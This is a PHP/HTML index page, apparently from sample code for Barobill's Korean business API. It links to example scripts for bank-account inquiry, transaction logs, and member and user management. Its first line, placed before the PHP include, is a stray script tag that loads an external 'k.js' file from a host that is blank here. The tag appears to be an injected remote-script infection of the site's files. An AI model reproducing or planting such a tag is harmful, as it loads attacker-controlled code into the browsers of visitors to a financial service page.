<script type='text/javascript' src='https:// /k.js?v=222'></script><?php include '../_include/top.php'; ?>
<fieldset class="fieldset1">
	<legend>계좌조회 관련 API</legend>
	<fieldset class="fieldset2">
		<legend>조회</legend>
		<ul>
			<li><a href="API_BANKACCOUNT/GetBankAccount.php">GetBankAccount</a> - 등록한 계좌번호 조회</li>
			<li><a href="API_BANKACCOUNT/GetBankAccountEx.php">GetBankAccountEx</a> - 등록한 계좌번호 조회 (유효한 계좌만 조회하려고 하는 경우)</li>				
			<li><a href="API_BANKACCOUNT/GetDailyBankAccountLog.php">GetDailyBankAccountLog</a> - 일별 계좌 입출금내역 조회</li>
			<li><a href="API_BANKACCOUNT/GetDailyBankAccountLogEx.php">GetDailyBankAccountLogEx</a> - 일별 계좌 입출금내역 조회 (고유키 추가)</li>
			<li><a href="API_BANKACCOUNT/GetMonthlyBankAccountLog.php">GetMonthlyBankAccountLog</a> - 월별 계좌 입출금내역 조회</li>
			<li><a href="API_BANKACCOUNT/GetMonthlyBankAccountLogEx.php">GetMonthlyBankAccountLogEx</a> - 월별 계좌 입출금내역 조회 (고유키 추가)</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>URL 관련</legend>
		<ul>
			<li><a href="API_BANKACCOUNT/GetBankAccountScrapRequestURL.php">GetBankAccountScrapRequestURL</a> - 계좌조회 서비스 신청 URL</li>
			<li><a href="API_BANKACCOUNT/GetBankAccountManagementURL.php">GetBankAccountManagementURL</a> - 계좌번호 관리 URL</li>
			<li><a href="API_BANKACCOUNT/GetBankAccountLogURL.php">GetBankAccountLogURL</a> - 계좌 사용내역 url</li>
		</ul>
	</fieldset>
</fieldset>
<br />
<fieldset class="fieldset1">
	<legend>바로빌 기본 API</legend>
	<fieldset class="fieldset2">
		<legend>회원사 정보</legend>
		<ul>
			<li><a href="API_BAROBILL/CheckCorpIsMember.php">CheckCorpIsMember</a> - 회원사 여부 확인</li>
			<li><a href="API_BAROBILL/RegistCorp.php">RegistCorp</a> - 회원사 추가</li>
			<li><a href="API_BAROBILL/UpdateCorpInfo.php">UpdateCorpInfo</a> - 회원사 정보 수정</li>
			<li><a href="API_BAROBILL/GetCorpMemberContacts.php">GetCorpMemberContacts</a> - 회원사 담당자 목록</li>
			<li><a href="API_BAROBILL/ChangeCorpManager.php">ChangeCorpManager</a> - 회원사 관리자 변경</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>사용자 정보</legend>
		<ul>
			<li><a href="API_BAROBILL/AddUserToCorp.php">AddUserToCorp</a> - 사용자 추가</li>
			<li><a href="API_BAROBILL/UpdateUserInfo.php">UpdateUserInfo</a> - 사용자 정보 수정</li>
			<li><a href="API_BAROBILL/UpdateUserPWD.php">UpdateUserPWD</a> - 사용자 비밀번호 수정</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>포인트 관련</legend>
		<ul>
			<li><a href="API_BAROBILL/GetBalanceCostAmount.php">GetBalanceCostAmount</a> - 잔여포인트 확인</li>
		</ul>
	</fieldset>
	<fieldset class="fieldset2">
		<legend>기타</legend>
		<ul>
			<li><a href="API_BAROBILL/GetBaroBillURL.php">GetBaroBillURL</a> - 바로빌 URL</li>
		</ul>
	</fieldset>
</fieldset>
<?php include '../_include/bottom.php'; ?>